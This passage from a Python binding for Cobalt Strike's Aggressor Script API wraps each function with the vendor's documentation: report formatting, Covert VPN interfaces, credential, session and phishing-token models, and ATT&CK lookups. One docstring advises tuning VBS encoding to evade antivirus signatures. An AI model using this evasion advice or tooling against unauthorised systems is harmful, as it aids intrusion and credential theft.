        To get past this VBS limitation, Cobalt Strike opted to use Chr() calls for non-ASCII data and runs of double-quoted strings for printable characters.
        This change, an engineering necessity, unintentionally defeated static anti-virus signatures for Cobalt Strike's default VBS artifacts at that time.
        If you're looking for an easy evasion benefit with VBS artifacts, consider adjusting the plaintext run length in your Resource Kit.
        Returns
        The shellcode after this transform is applied
        Example
        println(transform_vbs("This is a test!", "3"));

    """

    return engine.call('transform_vbs', args, fork=fork, sync=sync)


def tstamp(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Format a time into a date/time value. This value does not include seconds.
        Arguments
        $1 - the time [milliseconds since the UNIX epoch]
        Example
        println("The time is now: " . tstamp(ticks()));

        See Also
        &dstamp
    """

    return engine.call('tstamp', args, fork=fork, sync=sync)


def unbind(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Remove a keyboard shortcut binding.
        Arguments
        $1 - the keyboard shortcut
        Example
        # restore default behavior of Ctrl+Left and Ctrl+Right
        unbind("Ctrl+Left");
        unbind("Ctrl+Right");

        See Also
        &bind

    """

    return engine.call('unbind', args, fork=fork, sync=sync)


def url_open(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open a URL in the default browser.
        Arguments
        $1 - the URL to open
        Example
        command go {
            url_open("https://www.cobaltstrike.com/");
        }

    """

    return engine.call('url_open', args, fork=fork, sync=sync)


def users(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of users connected to this team server.
        Returns
        An array of users.
        Example
        foreach $user (users()) {
            println($user);
        }

    """

    return engine.call('users', args, fork=fork, sync=sync)


def vpn_interface_info(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information about a VPN interface.
        Arguments
        $1 - the interface name
        $2 - [Optional] the key to extract a value for
        Returns
        %info = vpn_interface_info("interface");

        Returns a dictionary with the metadata for this interface.
        $value = vpn_interface_info("interface", "key");

        Returns the value for the specified key from this interface's metadata
        Example
        # create a script console alias to interface info
        command interface {
            println("Interface $1");
            foreach $key => $value (vpn_interface_info($1)) {
                println("$[15]key $value");
            }
        }

    """

    return engine.call('vpn_interface_info', args, fork=fork, sync=sync)


def vpn_interfaces(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Return a list of VPN interface names
        Returns
        An array of interface names.
        Example
        printAll(vpn_interfaces());

    """

    return engine.call('vpn_interfaces', args, fork=fork, sync=sync)


def vpn_tap_create(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Create a Covert VPN interface on the team server system.
        Arguments
        $1 - the interface name (e.g., phear0)
        $2 - the MAC address ($null will make a random MAC address)
        $3 - reserved; use $null for now.
        $4 - the port to bind the VPN's channel to
        $5 - the type of channel [bind, http, icmp, reverse, udp]
        Example
        vpn_tap_create("phear0", $null, $null, 7324, "udp");

    """

    return engine.call('vpn_tap_create', args, fork=fork, sync=sync)


def vpn_tap_delete(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Destroy a Covert VPN interface
        Arguments
        $1 - the interface name (e.g., phear0)
        Example
        vpn_tap_destroy("phear0");

    """

    return engine.call('vpn_tap_delete', args, fork=fork, sync=sync)


def agApplications(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the applications model.
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the applications model.
        Example
        printAll(agApplications($model));

    """

    return engine.call('agApplications', args, fork=fork, sync=sync)


def agC2info(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the c2info model.
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the c2info model.
        Example
        printAll(agC2Info($model));

    """

    return engine.call('agC2info', args, fork=fork, sync=sync)


def agCredentials(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the credentials model
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the credentials model.
        Example
        printAll(agCredentials($model));

    """

    return engine.call('agCredentials', args, fork=fork, sync=sync)


def agServices(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the services model
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the services model.
        Example
        printAll(agServices($model));

    """

    return engine.call('agServices', args, fork=fork, sync=sync)


def agSessions(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the sessions model
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the sessions model.
        Example
        printAll(agSessions($model));

    """

    return engine.call('agSessions', args, fork=fork, sync=sync)


def agTargets(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the targets model.
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the targets model.
        Example
        printAll(agTargets($model));

    """

    return engine.call('agTargets', args, fork=fork, sync=sync)


def agTokens(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Pull information from the phishing tokens model.
        Arguments
        $1 - the model to pull this information from.
        Returns
        An array of dictionary objects that describes each entry in the phishing tokens model.
        Example
        printAll(agTokens($model));

    """

    return engine.call('agTokens', args, fork=fork, sync=sync)


def attack_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Maps a MITRE ATT&CK tactic ID to its longer description.
        Returns
        The full description of the tactic
        Example
        println(attack_describe("T1134"));

    """

    return engine.call('attack_describe', args, fork=fork, sync=sync)


def attack_detect(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Maps a MITRE ATT&CK tactic ID to its detection strategy
        Returns
        The detection strategy for this tactic.
        Example
        println(attack_detect("T1134"));

    """

    return engine.call('attack_detect', args, fork=fork, sync=sync)


def attack_mitigate(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Maps a MITRE ATT&CK tactic ID to its mitigation strategy
        Returns
        The mitigation strategy for this tactic.
        Example
        println(attack_mitigate("T1134"));

    """

    return engine.call('attack_mitigate', args, fork=fork, sync=sync)


def attack_name(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Maps a MITRE ATT&CK tactic ID to its short name.
        Returns
        The name or short description of the tactic.
        Example
        println(attack_name("T1134"));

    """

    return engine.call('attack_name', args, fork=fork, sync=sync)


def attack_tactics(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        An array of MITRE ATT&CK tactics known to Cobalt Strike.
        https://attack.mitre.org
        Returns
        An array of tactic IDs (e.g., T1001, T1002, etc.).
        Example
        printAll(attack_tactics());

    """

    return engine.call('attack_tactics', args, fork=fork, sync=sync)


def attack_url(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Maps a MITRE ATT&CK tactic ID to the URL where you can learn more.
        Returns
        The URL associated with this tactic.
        Example
        println(attack_url("T1134"));

    """

    return engine.call('attack_url', args, fork=fork, sync=sync)


def bookmark(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Define a bookmark [PDF document only]
        Arguments
        $1 - The bookmark to define [must be the same as &h1 or &h2 title].
        $2 - (Optional) Define a child bookmark [must be the same as &h1 or &h2 title].
        Example
        # build out a document structure
        h1("First");
        h2("Child #1");
        h2("Child #2");

        # define bookmarks for it
        bookmark("First");
        bookmark("First", "Child #1");
        bookmark("First", "Child #2");

    """

    return engine.call('bookmark', args, fork=fork, sync=sync)


def br(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Print a line-break.
        Example
        br();

    """

    return engine.call('br', args, fork=fork, sync=sync)


def describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Set a description for a report.
        Arguments
        $1 - The report to set a default description for.
        $2 - The default description
        Example
        describe("Foo Report", "This report is about my foo");

        report "Foo Report" {
            # yada yada yada...
        }

    """

    return engine.call('describe', args, fork=fork, sync=sync)


def h1(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a title heading.
        Arguments
        $1 - the heading to print.
        Example
        h1("I am the title");

    """

    return engine.call('h1', args, fork=fork, sync=sync)


def h2(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a sub-title heading.
        Arguments
        $1 - the text to print.
        Example
        h2("I am the sub-title");

    """

    return engine.call('h2', args, fork=fork, sync=sync)


def h3(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a sub-sub-title heading.
        Arguments
        $1 - the text to print.
        Example
        h3("I am not important.");

    """

    return engine.call('h3', args, fork=fork, sync=sync)


def h4(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a sub-sub-sub-title heading.
        Arguments
        $1 - the text to print.
        Example
        h4("I am really not important.");

    """

    return engine.call('h4', args, fork=fork, sync=sync)


def kvtable(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a table with key/value pairs.
        Arguments
        $1 - a dictionary with key/value pairs to print.
        Example
        # use an ordered-hash to preserve order
        $table = ohash();
        $table["#1"] = "first";
        $table["#2"] = "second";
        $table["#3"] = "third";

        kvtable($table);

    """

    return engine.call('kvtable', args, fork=fork, sync=sync)


def landscape(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Changes the orientation of this document to landscape.
        Example
        landscape();

    """

    return engine.call('landscape', args, fork=fork, sync=sync)


def layout(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a table with no borders and no column headers.
        Arguments
        $1 - an array with column names
        $2 - an array with width values for each column
        $3 - an array with a dictionary object for each row. The dictionary should have keys that correspond to each column.
        Example
        @cols    = @("First", "Second", "Third");
        @widths  = @("2in", "2in", "auto");
        @rows    = @(
                %(First => "a", Second => "b", Third => "c"),
                %(First => "1", Second => "2", Third => "3"));

        layout(@cols, @widths, @rows);

    """

    return engine.call('layout', args, fork=fork, sync=sync)


def list_unordered(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints an unordered list
        Arguments
        $1 - an array with individual bullet points.
        Example
        @list = @("apple", "bat", "cat");
        list_unordered(@list);

    """

    return engine.call('list_unordered', args, fork=fork, sync=sync)


def nobreak(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Group report elements together without a line break.
        Arguments
        $1 - the function with report elements to group together.
        Example
        # keep this stuff on the same page...
        nobreak({
            h2("I am the sub-title");
            p("I am the initial information");
        });

    """

    return engine.call('nobreak', args, fork=fork, sync=sync)


def output(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Print elements against a grey backdrop. Line-breaks are preserved.
        Arguments
        $1 - the function with report elements to group as output.
        Example
        output({
            p("This is line 1
            and this is line 2.");
        });

    """

    return engine.call('output', args, fork=fork, sync=sync)


def p(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a paragraph of text.
        Arguments
        $1 - the text to print.
        Example
        p("I am some text!");

    """

    return engine.call('p', args, fork=fork, sync=sync)


def p_formatted(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a paragraph of text with some format preservation.
        Arguments
        $1 - the text to print.
        The Format Markup
        1. This function preserves newlines
        2. You may specify bulleted lists:
        * I am item 1
        * I am item 2
        * etc.

        3. You may specify a heading
        ===I am a heading===

        Example
        p_formatted("===Hello World===\n\nThis is some text.\nI am on a new line\nAnd, I am:\n* Cool\n* Awesome\n* A bulleted list");

    """

    return engine.call('p_formatted', args, fork=fork, sync=sync)


def table(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a table
        Arguments
        $1 - an array with column names
        $2 - an array with width values for each column
        $3 - an array with a dictionary object for each row. The dictionary should have keys that correspond to each column.
        Example
        @cols    = @("First", "Second", "Third");
        @widths  = @("2in", "2in", "auto");
        @rows    = @(
                %(First => "a", Second => "b", Third => "c"),
                %(First => "1", Second => "2", Third => "3"));

        table(@cols, @widths, @rows);

    """

    return engine.call('table', args, fork=fork, sync=sync)


def ts(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/rfunctions.html:

        Prints a time/date stamp in italics.
        Example
        ts();

    """

    return engine.call('ts', args, fork=fork, sync=sync)


def print(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('print', args, fork=fork, sync=sync)


def println(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('println', args, fork=fork, sync=sync)


def printAll(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('printAll', args, fork=fork, sync=sync)


def warn(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('warn', args, fork=fork, sync=sync)


def debug(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('debug', args, fork=fork, sync=sync)


def command(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('command', args, fork=fork, sync=sync)


def cast(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('cast', args, fork=fork, sync=sync)


def casti(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('casti', args, fork=fork, sync=sync)


def typeOf(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('typeOf', args, fork=fork, sync=sync)


def exit(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('exit', args, fork=fork, sync=sync)


def systemProperties(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('systemProperties', args, fork=fork, sync=sync)


def cwd(*args, fork=None, sync=True):
    r"""
    Sleep function. See http://sleep.dashnine.org/manual/index.html
    """

    return engine.call('cwd', args, fork=fork, sync=sync)

